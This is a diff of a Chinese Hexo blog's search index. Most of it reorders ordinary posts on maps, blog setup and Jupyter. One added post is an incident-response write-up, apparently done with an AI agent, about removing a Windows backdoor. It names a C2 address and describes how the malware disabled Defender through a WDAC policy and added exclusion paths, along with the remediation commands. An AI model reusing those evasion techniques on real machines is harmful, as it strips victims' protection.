+<td>计划任务 <strong><code>H3ezE</code></strong>（随机任务名，登录时 + 定时触发，触发日期伪造成 2009 年）</td>
+</tr>
+</tbody></table>
+<h3 id="2-2-恶意程序-2：C-ProgramData-ZD3f8wk1-yIgaJZfC-exe（远控后门）"><a href="#2-2-恶意程序-2：C-ProgramData-ZD3f8wk1-yIgaJZfC-exe（远控后门）" class="headerlink" title="2.2 恶意程序 2：C:\ProgramData\ZD3f8wk1\yIgaJZfC.exe（远控后门）"></a>2.2 恶意程序 2：<code>C:\ProgramData\ZD3f8wk1\yIgaJZfC.exe</code>（远控后门）</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>文件</td>
+<td><code>yIgaJZfC.exe</code>（679 KB，随机文件名）</td>
+</tr>
+<tr>
+<td>网络行为</td>
+<td>外联 C2 服务器 <strong><code>27.124.34.221:8160</code></strong>（远控类端口）</td>
+</tr>
+<tr>
+<td>持久化</td>
+<td>伪装成微软遥测计划任务 <strong>“Execution Inventory Hierarchy Automation Feedback”</strong>（原任务应执行系统遥测程序，其 Execute 被篡改为 <code>yIgaJZfC.exe</code>，参数 1776；普通权限下不可见，需管理员权限才能查到）</td>
+</tr>
+</tbody></table>
+<h3 id="2-3-其他恶意痕迹"><a href="#2-3-其他恶意痕迹" class="headerlink" title="2.3 其他恶意痕迹"></a>2.3 其他恶意痕迹</h3><ul>
+<li><strong><code>C:\Windows\Temp\ranchserv.jpg</code></strong>：伪装成图片的可执行载荷，13:47 被 System 进程尝试加载（Code Integrity 审计记录），重启后已不存在</li>
+<li><strong>Defender 排除项污染</strong>：检测到工具型病毒 <code>VirTool:PowerShell/ExcludeProc.A</code>，病毒通过 PowerShell 将 5 个路径写入 Defender 排除列表（详见 3.3）</li>
+</ul>
+<hr>
+<h2 id="三、根因分析：为什么-Defender-会”罢工”"><a href="#三、根因分析：为什么-Defender-会”罢工”" class="headerlink" title="三、根因分析：为什么 Defender 会”罢工”"></a>三、根因分析：为什么 Defender 会”罢工”</h2><h3 id="3-1-直接证据"><a href="#3-1-直接证据" class="headerlink" title="3.1 直接证据"></a>3.1 直接证据</h3><p>服务启动失败的事件日志反复出现：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Microsoft Defender 防病毒服务 服务启动失败:</span><br><span class="line">应用程序控制策略已阻止此文件。</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-恶意-WDAC-策略（核心原因）"><a href="#3-2-恶意-WDAC-策略（核心原因）" class="headerlink" title="3.2 恶意 WDAC 策略（核心原因）"></a>3.2 恶意 WDAC 策略（核心原因）</h3><p>通过 <code>CiTool.exe -lp</code> 定位到一条<strong>强制执行的 WDAC 应用控制策略</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>策略 ID</td>
+<td><code>a244370e-44c9-4c06-b551-f6016e563076</code></td>
+</tr>
+<tr>
+<td>友好名称</td>
+<td><code>AllowMicrosoft_2023-05-04</code>（”仅允许微软签名程序运行”）</td>
+</tr>
+<tr>
+<td>强制执行</td>
+<td><strong>true</strong>（强制模式）</td>
+</tr>
+<tr>
+<td>被阻止对象</td>
+<td>Defender 引擎（MsMpEng.exe / MpCmdRun.exe）、第三方杀软（360 等）</td>
+</tr>
+<tr>
+<td>事件日志</td>
+<td>15:23:37 起连续记录 360 组件被 “did not meet the Enterprise signing level requirements” 阻止</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>该策略导致：所有第三方杀毒软件无法安装/运行，同时 Defender 引擎本身也被其严苛的签名级别要求（Custom 3 / Antimalware）拦截 → 电脑完全失去防护，病毒得以潜伏。</p>
+</blockquote>
+<h3 id="3-3-Defender-排除项污染（次因）"><a href="#3-3-Defender-排除项污染（次因）" class="headerlink" title="3.3 Defender 排除项污染（次因）"></a>3.3 Defender 排除项污染（次因）</h3><p>病毒将以下 5 个路径写入 Defender 排除列表，使 Defender 对病毒文件”视而不见”：</p>
+<table>
+<thead>
+<tr>
+<th>排除路径</th>
+<th>判断</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>C:\Users\Public\IEC4eK</code></td>
+<td>🔴 铁证（病毒目录本身）</td>
+</tr>
+<tr>
+<td><code>C:\Users</code>（整个用户目录）</td>
+<td>🔴 病毒写入</td>
+</tr>
+<tr>
+<td><code>C:\ProgramData</code></td>
+<td>🔴 病毒写入（后门目录所在）</td>
+</tr>
+<tr>
+<td><code>C:\Program Files (x86)</code></td>
+<td>🟡 可疑</td>
+</tr>
+<tr>
+<td><code>C:\Users\00RAISER\Documents</code></td>
+<td>🟡 可疑</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、处理过程"><a href="#四、处理过程" class="headerlink" title="四、处理过程"></a>四、处理过程</h2><h3 id="4-1-处置时间线"><a href="#4-1-处置时间线" class="headerlink" title="4.1 处置时间线"></a>4.1 处置时间线</h3><table>
+<thead>
+<tr>
+<th>时间</th>
+<th>操作</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>14:53-15:10</td>
+<td>只读诊断：服务状态、注册表启动项、计划任务、进程、网络连接、映像劫持、WMI 订阅、启动文件夹</td>
+<td>锁定 2 个恶意程序及 4 类持久化点</td>
+</tr>
+<tr>
+<td>15:11</td>
+<td>终止恶意进程</td>
+<td><code>yIgaJZfC.exe</code> 终止 ✅；<code>MbKSfy.exe</code> 需管理员权限</td>
+</tr>
+<tr>
+<td>15:12-15:15</td>
+<td>删除病毒目录 <code>IEC4eK</code></td>
+<td>✅ 已删除</td>
+</tr>
+<tr>
+<td>15:26</td>
+<td>用户以管理员身份重启 WorkBuddy，会话获得管理员权限</td>
+<td>后续操作全部以管理员执行</td>
+</tr>
+<tr>
+<td>15:27</td>
+<td>删除注册表启动项、计划任务 <code>H3ezE</code> + 伪装遥测任务、病毒目录 <code>ZD3f8wk1</code></td>
+<td>✅ 全部清除</td>
+</tr>
+<tr>
+<td>15:27-15:33</td>
+<td>诊断 Defender 启动失败：定位到 WDAC 策略</td>
+<td><code>CiTool -lp</code> 确认 <code>a244370e</code> 强制执行</td>
+</tr>
+<tr>
+<td>15:33</td>
+<td><code>CiTool.exe -rp a244370e-44c9-4c06-b551-f6016e563076</code> 删除恶意策略</td>
+<td>✅ <strong>WinDefend 立即启动成功</strong></td>
+</tr>
+<tr>
+<td>15:34</td>
+<td>更新病毒库 + 快速扫描</td>
+<td>签名 1.457.420.0 → 1.457.423.0 ✅；无活跃威胁</td>
+</tr>
+<tr>
+<td>15:35-15:50</td>
+<td>发现并清除 Defender 排除项污染</td>
+<td>✅ 5 个排除项全部清空</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-关键操作命令"><a href="#4-2-关键操作命令" class="headerlink" title="4.2 关键操作命令"></a>4.2 关键操作命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除恶意 WDAC 策略（Defender 恢复的关键一步）</span></span><br><span class="line">CiTool.exe -rp a244370e-<span class="number">44</span>c9-<span class="number">4</span>c06-b551-f6016e563076</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除被污染的 Defender 排除项</span></span><br><span class="line">Remove-MpPreference -ExclusionPath @(</span><br><span class="line">  <span class="string">"C:\Users\Public\IEC4eK"</span>,</span><br><span class="line">  <span class="string">"C:\Users"</span>,</span><br><span class="line">  <span class="string">"C:\ProgramData"</span>,</span><br><span class="line">  <span class="string">"C:\Program Files (x86)"</span>,</span><br><span class="line">  <span class="string">"C:\Users\00RAISER\Documents"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新病毒库 + 快速扫描</span></span><br><span class="line">Update-MpSignature</span><br><span class="line">Start-MpScan -ScanType QuickScan</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、最终状态"><a href="#五、最终状态" class="headerlink" title="五、最终状态"></a>五、最终状态</h2><h3 id="5-1-安全服务状态（全部恢复正常）"><a href="#5-1-安全服务状态（全部恢复正常）" class="headerlink" title="5.1 安全服务状态（全部恢复正常）"></a>5.1 安全服务状态（全部恢复正常）</h3><table>
+<thead>
+<tr>
+<th>服务</th>
+<th>状态</th>
+<th>启动类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WinDefend（Defender 防病毒）</td>
+<td>✅ Running</td>
+<td>Automatic</td>
+</tr>
+<tr>
+<td>MDCoreSvc（Defender 核心服务）</td>
+<td>✅ Running</td>
+<td>Automatic</td>
+</tr>
+<tr>
+<td>SecurityHealthService（安全中心）</td>
+<td>✅ Running</td>
+<td>Manual</td>
+</tr>
+<tr>
+<td>wscsvc（安全中心服务）</td>
+<td>✅ Running</td>
+<td>Automatic</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-Defender-防护能力"><a href="#5-2-Defender-防护能力" class="headerlink" title="5.2 Defender 防护能力"></a>5.2 Defender 防护能力</h3><table>
+<thead>
+<tr>
+<th>指标</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AntivirusEnabled</td>
+<td>✅ True</td>
+</tr>
+<tr>
+<td>RealTimeProtectionEnabled（实时保护）</td>
+<td>✅ True</td>
+</tr>
+<tr>
+<td>AMServiceEnabled</td>
+<td>✅ True</td>
+</tr>
+<tr>
+<td>病毒库签名版本</td>
+<td>1.457.423.0（已更新）</td>
+</tr>
+</tbody></table>
+<h3 id="5-3-扫描结果"><a href="#5-3-扫描结果" class="headerlink" title="5.3 扫描结果"></a>5.3 扫描结果</h3><ul>
+<li>快速扫描完成（15:34），<strong>无活跃威胁</strong></li>
+<li>历史记录 4 条 PUA 均不活跃（IsActive: False），为过往软件捆绑残留</li>
+</ul>
+<hr>
+<h2 id="六、处置清单汇总"><a href="#六、处置清单汇总" class="headerlink" title="六、处置清单汇总"></a>六、处置清单汇总</h2><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>项目</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>进程</td>
+<td><code>MbKSfy.exe</code>、<code>yIgaJZfC.exe</code>（C2 后门）</td>
+<td>✅ 终止</td>
+</tr>
+<tr>
+<td>文件</td>
+<td><code>C:\Users\Public\IEC4eK\</code>、<code>C:\ProgramData\ZD3f8wk1\</code> 病毒目录</td>
+<td>✅ 删除</td>
+</tr>
+<tr>
+<td>启动项</td>
+<td>伪装”腾讯安全健康”注册表项</td>
+<td>✅ 删除</td>
+</tr>
+<tr>
+<td>计划任务</td>
+<td><code>H3ezE</code>、伪装微软遥测任务（2 条）</td>
+<td>✅ 删除</td>
+</tr>
+<tr>
+<td>系统策略</td>
+<td>恶意 WDAC 策略 <code>AllowMicrosoft_2023-05-04</code></td>
+<td>✅ 删除</td>
+</tr>
+<tr>
+<td>排除项</td>
+<td>5 个被污染的 Defender 排除路径</td>
+<td>✅ 清空</td>
+</tr>
+<tr>
+<td>安全服务</td>
+<td>WinDefend / MDCoreSvc / 安全中心</td>
+<td>✅ 全部 Running</td>
+</tr>
+<tr>
+<td>防护能力</td>
+<td>实时保护 + 反病毒</td>
+<td>✅ 已启用</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、后续建议"><a href="#七、后续建议" class="headerlink" title="七、后续建议"></a>七、后续建议</h2><ol>
+<li><strong>重启电脑</strong>，打开”Windows 安全中心”确认”病毒和威胁防护”页面正常显示（右键菜单应已回归）</li>
+<li><strong>执行一次完整扫描</strong>：Windows 安全中心 → 病毒和威胁防护 → 扫描选项 → <strong>完全扫描</strong>（约 1-2 小时，建议挂机）</li>
+<li><strong>修改关键密码</strong>：该木马有 C2 外联（27.124.34.221:8160），存在凭据被窃风险，建议尽快修改微软账户、邮箱、网银等密码</li>
+<li><strong>确认残留组件</strong>：<code>C:\Users\00RAISER\AppData\Local\Temp\doubao_ext\shellext.dll</code>（explorer 加载的豆包浏览器 shell 扩展，若不再使用豆包建议删除整个 <code>doubao_ext</code> 目录）</li>
+<li><strong>防复发</strong>：<ul>
+<li>保持 Windows 更新及时</li>
+<li>不安装来源不明的软件，警惕伪装成知名软件/系统组件的安装包</li>
+<li>如需为某正版软件放行 WDAC 策略，使用”补充策略”方式（见附录），不要直接改主策略</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="八、附录：关键参考"><a href="#八、附录：关键参考" class="headerlink" title="八、附录：关键参考"></a>八、附录：关键参考</h2><h3 id="8-1-诊断过程产物（工作区文件）"><a href="#8-1-诊断过程产物（工作区文件）" class="headerlink" title="8.1 诊断过程产物（工作区文件）"></a>8.1 诊断过程产物（工作区文件）</h3><p><code>diag*.txt</code>（多轮诊断输出）、<code>clean_result.txt</code>、<code>final_clean*.txt</code>、<code>policy_diag*.txt</code>、<code>sig_diag.txt</code>、<code>citool*.txt</code>、<code>exclusion_*.txt</code>、<code>scan_*.txt</code>、<code>clean_virus_admin.ps1</code>（管理员清理脚本）</p>
+<h3 id="8-2-主要诊断思路（可复用于类似场景）"><a href="#8-2-主要诊断思路（可复用于类似场景）" class="headerlink" title="8.2 主要诊断思路（可复用于类似场景）"></a>8.2 主要诊断思路（可复用于类似场景）</h3><ol>
+<li>症状 → 检查安全服务状态（<code>Get-Service</code>）与注册表启动项</li>
+<li>排查计划任务（注意<strong>管理员权限</strong>才能看到被隐藏/伪装的系统任务）</li>
+<li>服务启动失败报”应用程序控制策略已阻止此文件” → <strong>定位 WDAC 策略</strong>（<code>CiTool -lp</code>）→ 确认恶意策略后 <code>CiTool -rp &lt;ID&gt;</code> 删除</li>
+<li>检查 Defender 排除项（<code>Get-MpPreference</code>）是否被病毒污染</li>
+<li>更新病毒库 → 快速扫描 → 建议完整扫描</li>
+</ol>
 ]]></content>
       <tags>
-        <tag>博客</tag>
         <tag>吐槽</tag>
+        <tag>AI</tag>
+        <tag>智能体</tag>
       </tags>
   </entry>
   <entry>
@@ -1490,37 +1825,6 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
-    <title>做成我的足迹续</title>
-    <url>/2021/03/25/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9%E7%BB%AD/</url>
-    <content><![CDATA[<h1 id="做成我的足迹续"><a href="#做成我的足迹续" class="headerlink" title="做成我的足迹续"></a>做成我的足迹续</h1><p><em>光阴荏苒，日月如梭，往事随风，飘散而过。</em><br>距离上次写的文章<a href="https://xuchunlei.top/2019/11/21/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9/">做成我的足迹</a>已经过去490天，期间足迹增加了一点点。最近很忙加上确实没有啥能写的，就鸽了很久（106天）。这周开始才稍微有点时间，想着写点东西，因为手里有一些半成品拿不出手，就想到之前的足迹还有让我pass的地图，然后就开始了XX补全（橙汁）计划<sub>最近EVA新剧场版反响不小啊</sub>。</p>
-<h4 id="谷歌地图"><a href="#谷歌地图" class="headerlink" title="谷歌地图"></a>谷歌地图</h4><p>使用需要结算账号（绑定银行卡），账号劝退！国家地区里没有中国选项（也没有朝鲜），有港澳台地区。这里选的香港，因为要国际通用的银行卡，然而我并没有。<br><img src="/img/20210325/1.png" alt><br>后来发现国家地区选择日本可以使用PayPal，可以绑定银联卡，这里就没有再尝试了。补完失败……<br><img src="/img/20210325/2.png" alt></p>
-<h4 id="高德地图"><a href="#高德地图" class="headerlink" title="高德地图"></a>高德地图</h4><p>高德只能国内用，国外的点只能看看。经纬度数据使用了之前百度地图的，但是因为坐标系不一样，不能直接使用,需要把百度坐标BD-09转成火星坐标GCJ-02。</p>
-<blockquote>
-<p>WGS-84坐标系：地心坐标系，GPS原始坐标体系</p>
-<blockquote>
-<p>国内不允许使用</p>
-</blockquote>
-<p>GCJ-02 坐标系：火星坐标系</p>
-<blockquote>
-<p>国测局02年发布的坐标体系，它是一种对经纬度数据加入随机的偏差的加密算法<br>互联网地图在国内必须至少使用GCJ-02进行首次加密</p>
-</blockquote>
-<p>BD-09坐标系</p>
-<blockquote>
-<p>百度中国地图所采用的坐标系，由GCJ-02进行进一步的偏移算法得到</p>
-</blockquote>
-</blockquote>
-<p>其他功能基本类似，稍微修改一下就能了，直接上<a href="https://xuchunlei.top/myTrailsAMap" target="_blank">展示页面（代码）</a>和效果图。<br><img src="/img/20210325/3.png" alt></p>
-<h4 id="必应地图"><a href="#必应地图" class="headerlink" title="必应地图"></a>必应地图</h4><p>国内国外都能用，经纬度依旧使用百度的，国内的经纬度<code>只要转成GCJ-02就可以了</code>,<code>只要转成GCJ-02就可以了</code>,<code>只要转成GCJ-02就可以了</code>。重要的事情说三遍，这里坑了一下，以为国内的坐标也要转换成WGS-84GPS原始坐标。其他功能除了行政区划polygon，基本类似。行政区划polygon用的高德地图API获取行经纬度数据，然后用必应地图的polygon描绘。还有必应地图开发中心账号登录的时候需要科学上网一下，其他都不需要。这里列一下用到的网址，然后上<a href="https://xuchunlei.top/myTrailsBingMap" target="_blank">展示页面（代码）</a>和效果图。<br><a href="https://www.bingmapsportal.com/" target="_blank" rel="noopener">必应地图开发中心</a><br><a href="https://cn.bing.com/maps/sdkrelease/mapcontrol/isdk/loadmapasync" target="_blank" rel="noopener">必应地图Demo</a><br><a href="https://docs.microsoft.com/en-us/bingmaps/v8-web-control/map-control-api/" target="_blank" rel="noopener">必应地图API参考</a><br><img src="/img/20210325/4.png" alt></p>
-<h4 id="雅虎地图"><a href="#雅虎地图" class="headerlink" title="雅虎地图"></a>雅虎地图</h4><p>额，API终止服务……<br><img src="/img/20210325/5.png" alt></p>
-<p>只简单修改了一下，样式什么的懒得微调了，毕竟之前的百度地图的样式也不咋地。国内其他的还有腾讯地图，搜狗地图貌似都是自己的坐标系，估计以后也不会再搞了。</p>
-]]></content>
-      <tags>
-        <tag>足迹</tag>
-        <tag>高德地图</tag>
-        <tag>必应地图</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>初识Anaconda</title>
     <url>/2025/04/28/%E5%88%9D%E8%AF%86Anaconda/</url>
     <content><![CDATA[<p><em>接受朋友建议，开始学习AI相关的东西，简单记录下</em></p>
@@ -1586,6 +1890,88 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
+    <title>做成我的足迹续</title>
+    <url>/2021/03/25/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9%E7%BB%AD/</url>
+    <content><![CDATA[<h1 id="做成我的足迹续"><a href="#做成我的足迹续" class="headerlink" title="做成我的足迹续"></a>做成我的足迹续</h1><p><em>光阴荏苒，日月如梭，往事随风，飘散而过。</em><br>距离上次写的文章<a href="https://xuchunlei.top/2019/11/21/%E5%81%9A%E6%88%90%E6%88%91%E7%9A%84%E8%B6%B3%E8%BF%B9/">做成我的足迹</a>已经过去490天，期间足迹增加了一点点。最近很忙加上确实没有啥能写的，就鸽了很久（106天）。这周开始才稍微有点时间，想着写点东西，因为手里有一些半成品拿不出手，就想到之前的足迹还有让我pass的地图，然后就开始了XX补全（橙汁）计划<sub>最近EVA新剧场版反响不小啊</sub>。</p>
+<h4 id="谷歌地图"><a href="#谷歌地图" class="headerlink" title="谷歌地图"></a>谷歌地图</h4><p>使用需要结算账号（绑定银行卡），账号劝退！国家地区里没有中国选项（也没有朝鲜），有港澳台地区。这里选的香港，因为要国际通用的银行卡，然而我并没有。<br><img src="/img/20210325/1.png" alt><br>后来发现国家地区选择日本可以使用PayPal，可以绑定银联卡，这里就没有再尝试了。补完失败……<br><img src="/img/20210325/2.png" alt></p>
+<h4 id="高德地图"><a href="#高德地图" class="headerlink" title="高德地图"></a>高德地图</h4><p>高德只能国内用，国外的点只能看看。经纬度数据使用了之前百度地图的，但是因为坐标系不一样，不能直接使用,需要把百度坐标BD-09转成火星坐标GCJ-02。</p>
+<blockquote>
+<p>WGS-84坐标系：地心坐标系，GPS原始坐标体系</p>
+<blockquote>
+<p>国内不允许使用</p>
+</blockquote>
+<p>GCJ-02 坐标系：火星坐标系</p>
+<blockquote>
+<p>国测局02年发布的坐标体系，它是一种对经纬度数据加入随机的偏差的加密算法<br>互联网地图在国内必须至少使用GCJ-02进行首次加密</p>
+</blockquote>
+<p>BD-09坐标系</p>
+<blockquote>
+<p>百度中国地图所采用的坐标系，由GCJ-02进行进一步的偏移算法得到</p>
+</blockquote>
+</blockquote>
+<p>其他功能基本类似，稍微修改一下就能了，直接上<a href="https://xuchunlei.top/myTrailsAMap" target="_blank">展示页面（代码）</a>和效果图。<br><img src="/img/20210325/3.png" alt></p>
+<h4 id="必应地图"><a href="#必应地图" class="headerlink" title="必应地图"></a>必应地图</h4><p>国内国外都能用，经纬度依旧使用百度的，国内的经纬度<code>只要转成GCJ-02就可以了</code>,<code>只要转成GCJ-02就可以了</code>,<code>只要转成GCJ-02就可以了</code>。重要的事情说三遍，这里坑了一下，以为国内的坐标也要转换成WGS-84GPS原始坐标。其他功能除了行政区划polygon，基本类似。行政区划polygon用的高德地图API获取行经纬度数据，然后用必应地图的polygon描绘。还有必应地图开发中心账号登录的时候需要科学上网一下，其他都不需要。这里列一下用到的网址，然后上<a href="https://xuchunlei.top/myTrailsBingMap" target="_blank">展示页面（代码）</a>和效果图。<br><a href="https://www.bingmapsportal.com/" target="_blank" rel="noopener">必应地图开发中心</a><br><a href="https://cn.bing.com/maps/sdkrelease/mapcontrol/isdk/loadmapasync" target="_blank" rel="noopener">必应地图Demo</a><br><a href="https://docs.microsoft.com/en-us/bingmaps/v8-web-control/map-control-api/" target="_blank" rel="noopener">必应地图API参考</a><br><img src="/img/20210325/4.png" alt></p>
+<h4 id="雅虎地图"><a href="#雅虎地图" class="headerlink" title="雅虎地图"></a>雅虎地图</h4><p>额，API终止服务……<br><img src="/img/20210325/5.png" alt></p>
+<p>只简单修改了一下，样式什么的懒得微调了，毕竟之前的百度地图的样式也不咋地。国内其他的还有腾讯地图，搜狗地图貌似都是自己的坐标系，估计以后也不会再搞了。</p>
+]]></content>
+      <tags>
+        <tag>足迹</tag>
+        <tag>高德地图</tag>
+        <tag>必应地图</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>制作一个简单的博客</title>
+    <url>/2019/11/07/%E5%88%B6%E4%BD%9C%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h1 id="制作一个简单的博客"><a href="#制作一个简单的博客" class="headerlink" title="制作一个简单的博客"></a>制作一个简单的博客</h1><p><em>没错，说的就是这个，算是第一篇博客文章吧</em></p>
+<p>基于博客框架<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a>+<a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a>，通过<a href="http://www.markdown.cn/" target="_blank" rel="noopener">Markdown</a>来书写文章。无域名，无服务器，如果没有什么特殊需求的话，金钱投入0。网上这方面文章烂大街了，这里不做详细介绍。</p>
+<p><a href="https://nodejs.org" target="_blank" rel="noopener">Node.js</a>,<a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>默认都会，不解释。</p>
+<blockquote>
+<h2 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h2></blockquote>
+<p>看官网教程就可以，我只看了一点。Hexo有很多主题，找自己喜欢的就行。我的是在<a href="https://github.com/Fechin/hexo-theme-diaspora" target="_blank" rel="noopener">Diaspora</a>基础上改的，主要加了网页背景。</p>
+<h4 id="这里补充两点："><a href="#这里补充两点：" class="headerlink" title="这里补充两点："></a>这里补充两点：</h4><ul>
+<li>主题下载命名问题<br>有的主题带hexo-theme-的前缀，放到themes文件夹的时候要去掉这个。</li>
+<li>主题自定义Front-Matter<br>这个每个主题设置的可能都不一样，比如Diaspora的文章封面参数cover就是自己定义的。</li>
+</ul>
+<blockquote>
+<h2 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h2></blockquote>
+<p>申请一个GitHub账号，新建一个和账号名字一样的仓库即可。不过可能找不到你想要的名字（大部分都被申请过了，比如这个账号的名字就是在我想要的基础上变换出来的）。<br>以前写过关于GithubPage的文章，可以点击<a href="https://mp.weixin.qq.com/s/nm1OPwHY4Lz8ClHroPZZJA" target="_blank" rel="noopener">这里</a>查看。</p>
+<blockquote>
+<h2 id="额外补充"><a href="#额外补充" class="headerlink" title="额外补充"></a>额外补充</h2></blockquote>
+<p><em>到这才知道，GitHub不同账号不能绑定相同的ssh<br>手动部署到GitHub，发现评论不能用，原来还需要配置Gitalk（主题限定）</em></p>
+]]></content>
+      <tags>
+        <tag>博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初识Jupyter Notebook</title>
+    <url>/2025/05/20/%E5%88%9D%E8%AF%86Jupyter%20Notebook/</url>
+    <content><![CDATA[<p><em>接受朋友建议，开始学习AI相关的东西，简单记录下</em></p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://jupyter.org/" target="_blank" rel="noopener">Jupyter Notebook</a>一个开源的Web应用程序，便于创建和共享程序文档。支持实时代码，数学方程，图表，图像，Markdown等内容的文档。可以交互地编写代码，执行代码并查看结果，支持多人实时编辑和协作，支持多种编程语言，包括Python、R、Julia等。用于数据分析，机器学习，人工智能等等。</p>
+<h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><p>需要先安装Python<br>第一种是原生Python安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#升级pip版本</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">#安装</span><br><span class="line">pip install jupyter</span><br></pre></td></tr></table></figure>
+
+<p>不过，pip或者pip3安装都报错，貌似缺少Rust工具链（Rustup），需要先装。<br><img src="/img/20250520/1.jpg" alt></p>
+<p>另一种是通过Anaconda</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install jupyter notebook</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/20250520/2.png" alt></p>
+<p>运行Jupyter Notebook，从命令行中启动，需要一直开启</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#默认端口8888启动并打开浏览器</span><br><span class="line">jupyter notebook</span><br><span class="line">#指定端口启动</span><br><span class="line">jupyter notebook --port &lt;port_number&gt;</span><br><span class="line">#启动服务器但不打开浏览器</span><br><span class="line">jupyter notebook --no-browser</span><br><span class="line">#启动时打开指定文档</span><br><span class="line">jupyter notebook notebook.ipynb</span><br></pre></td></tr></table></figure>
+
+<p>默认启动界面<br><img src="/img/20250520/3.png" alt></p>
+<h3 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#所有配置目录</span><br><span class="line">jupyter --paths</span><br><span class="line">#配置目录</span><br><span class="line">jupyter --config-dir</span><br><span class="line">#数据目录</span><br><span class="line">jupyter --data-dir</span><br><span class="line">#运行时目录</span><br><span class="line">jupyter --runtime-dir</span><br></pre></td></tr></table></figure>
+
+<h3 id="基本操做"><a href="#基本操做" class="headerlink" title="基本操做"></a>基本操做</h3><p><img src="/img/20250520/7.png" alt><br>工具栏<br>保存，插入单元格，剪切单元格，复制单元格，粘贴单元格(到下方)，运行单元格，重置内核，充值内核并运行所有单元格，选择单元格类型（代码，Markdown等）<br>单元格工具栏<br>复制单元格并插入到下方，上移单元格，下移单元格，在前面插入单元格，在后面插入单元格，删除单元格</p>
+<p>新建文档，扩展名ipynb<br><img src="/img/20250520/4.png" alt><br>内核选择Python3<br><img src="/img/20250520/5.png" alt><br>文档效果展示，单元格支持Markdown语法和代码执行<br><img src="/img/20250520/6.png" alt></p>
+]]></content>
+      <tags>
+        <tag>AI</tag>
+        <tag>Jupyter</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初识NumPy</title>
     <url>/2025/07/19/%E5%88%9D%E8%AF%86NumPy/</url>
     <content><![CDATA[<p><em>接受朋友建议，开始学习AI相关的东西，简单记录下。</em></p>
@@ -1638,33 +2024,6 @@ console.log(&quot;Hello world Tab&quot;)</code></pre><figure class="highlight ht
       </tags>
   </entry>
   <entry>
-    <title>初识Jupyter Notebook</title>
-    <url>/2025/05/20/%E5%88%9D%E8%AF%86Jupyter%20Notebook/</url>
-    <content><![CDATA[<p><em>接受朋友建议，开始学习AI相关的东西，简单记录下</em></p>
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://jupyter.org/" target="_blank" rel="noopener">Jupyter Notebook</a>一个开源的Web应用程序，便于创建和共享程序文档。支持实时代码，数学方程，图表，图像，Markdown等内容的文档。可以交互地编写代码，执行代码并查看结果，支持多人实时编辑和协作，支持多种编程语言，包括Python、R、Julia等。用于数据分析，机器学习，人工智能等等。</p>
-<h3 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h3><p>需要先安装Python<br>第一种是原生Python安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#升级pip版本</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">#安装</span><br><span class="line">pip install jupyter</span><br></pre></td></tr></table></figure>
-
-<p>不过，pip或者pip3安装都报错，貌似缺少Rust工具链（Rustup），需要先装。<br><img src="/img/20250520/1.jpg" alt></p>
-<p>另一种是通过Anaconda</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install jupyter notebook</span><br></pre></td></tr></table></figure>
-
-<p><img src="/img/20250520/2.png" alt></p>
-<p>运行Jupyter Notebook，从命令行中启动，需要一直开启</p>
